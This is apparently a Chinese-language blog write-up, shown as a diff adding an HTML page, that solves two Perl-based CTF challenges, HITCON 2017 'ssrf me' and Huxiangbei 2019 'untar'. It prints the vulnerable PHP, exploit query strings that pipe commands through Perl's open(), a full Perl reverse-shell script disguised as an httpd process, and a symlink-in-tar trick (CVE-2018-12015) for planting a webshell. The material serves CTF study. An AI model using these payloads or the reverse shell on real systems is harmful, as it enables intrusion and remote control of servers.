@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Hitcon2017ssrf_me&amp;&amp;湖湘杯untar - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,代码注入,perl,ssrf>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Hitcon2017ssrf_me&amp;&amp;湖湘杯untar</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-me"><span class="toc-text">ssrf me</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-open函数命令执行"><span class="toc-text">1. open函数命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CVE-2016-1238"><span class="toc-text">2.CVE-2016-1238</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#untar"><span class="toc-text">untar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-CVE-2018-12015"><span class="toc-text">1. CVE-2018-12015</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-UNTAR-命令执行"><span class="toc-text">2.UNTAR 命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CVE-2016-1238"><span class="toc-text">3.CVE-2016-1238</span></a></li></ol></li></ol></li></ol>
+
+  <div class="post-content">
+    <p>和perl相关的两道题目</p>
+<h2 id="ssrf-me"><a href="#ssrf-me" class="headerlink" title="ssrf me"></a>ssrf me</h2><p>Hitcon2017的一道题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>传马不解析</li>
+<li>GET是一个用perl开发的工具，用于发送http请求，kali中默认就有</li>
+<li>用?url=/etc/passwd&amp;filename=passwd.txt可以读到内容，但是flag读不到</li>
+<li>?url=/etc/passwd&amp;filename=ls.txt可以列出根目录，发现存在一个readflag，因此要想办法执行这个readflag</li>
+</ul>
+<p>有两种方法：</p>
+<h4 id="1-open函数命令执行"><a href="#1-open函数命令执行" class="headerlink" title="1. open函数命令执行"></a>1. open函数命令执行</h4><p>GET中使用了open函数，该函数可以命令执行</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span>(FD, <span class="string">"|id"</span>); <span class="comment">#id|也可以</span></span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br></pre></td></tr></table></figure>
+<p>GET中会先判断文件是否存在，因此要先创建文件<br>?url=/etc/passwd&amp;filename=%2freadflag%7C<br>?url=file:%2freadflag%7C&amp;filename=flag.txt<br>访问flag.txt得到flag</p>
+<h4 id="2-CVE-2016-1238"><a href="#2-CVE-2016-1238" class="headerlink" title="2.CVE-2016-1238"></a>2.CVE-2016-1238</h4><p>漏洞相关信息：<a href="https://www.anquanke.com/vul/id/1146868" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1146868</a></p>
+<ul>
+<li>准备一个perl的后门<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>?url=<a href="http://xxx/fuck.txt&amp;filename=URI/fuck.pm" target="_blank" rel="noopener">http://xxx/fuck.txt&amp;filename=URI/fuck.pm</a><br>将perl后门写入</li>
+<li>监听端口后，?filename=/etc/passwd/&amp;url=fuck://fuck.com<br>这时perl会去搜索并载入fuck.pm,执行我们的后门</li>
+</ul>
+<h2 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h2><p>湖湘杯2019的题目，是根据上一题改过来的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; !preg_match(<span class="string">'/^(http|https):\/\/.*/'</span>, $_GET[<span class="string">"url"</span>]))</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    $url  = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($url));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    shell_exec(<span class="string">"UNTAR "</span>.escapeshellarg(basename($info[<span class="string">"basename"</span>])));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>GET那里限制了|和协议</li>
+<li>使用了看起来和GET类似的UNTAR</li>
+<li>webshell在沙盒目录中不解析<h4 id="1-CVE-2018-12015"><a href="#1-CVE-2018-12015" class="headerlink" title="1. CVE-2018-12015"></a>1. CVE-2018-12015</h4>漏洞详情可以参见<a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=900834" target="_blank" rel="noopener">https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=900834</a></li>
+</ul>
+<p>主要就是利用软链接来达到读取文件和访问目录，可以发现flag无法直接读到，根目录下同样存在一个readflag</p>
+<ul>
+<li>在tar压缩包中放一个指向/var/www/html/sandbox的软链接<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html/sandbox wxynb</span><br><span class="line">tar -cvf fuck.tar wxynb</span><br></pre></td></tr></table></figure></li>
+<li>?url=<a href="http://xxx/fuck.tar&amp;filename=wxynb" target="_blank" rel="noopener">http://xxx/fuck.tar&amp;filename=wxynb</a> 创建软链接</li>
+<li>?url=<a href="http://xxx/webshell.tar&amp;filename=wxynb/a.php" target="_blank" rel="noopener">http://xxx/webshell.tar&amp;filename=wxynb/a.php</a><br>这样webshell就会写到sandbox目录下，能够解析</li>
+</ul>
+<h4 id="2-UNTAR-命令执行"><a href="#2-UNTAR-命令执行" class="headerlink" title="2.UNTAR 命令执行"></a>2.UNTAR 命令执行</h4><p>可以用上面软链接的方法读取到UNTAR的源码(设置一个软链接指向UNTAR,然后访问这个软链接)</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> Archive::Tar;</span><br><span class="line"><span class="keyword">my</span> $tar = Archive::Tar-&gt;new;</span><br><span class="line">$tar-&gt;extract_archive(<span class="string">"$ARGV[0]"</span>);</span><br></pre></td></tr></table></figure>
+<p>UNTAR 同样存在和GET一样的问题，可以命令执行，具体代码就不分析了</p>
+<h4 id="3-CVE-2016-1238"><a href="#3-CVE-2016-1238" class="headerlink" title="3.CVE-2016-1238"></a>3.CVE-2016-1238</h4><p>还是上题的那个漏洞，这里虽然限制了只能是http协议，但是可以在我们自己的vps上设置协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: fuck://fuck.com"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其他类似上一题</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-11-20</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/perl/" rel="tag">perl</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" rel="tag">代码注入</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
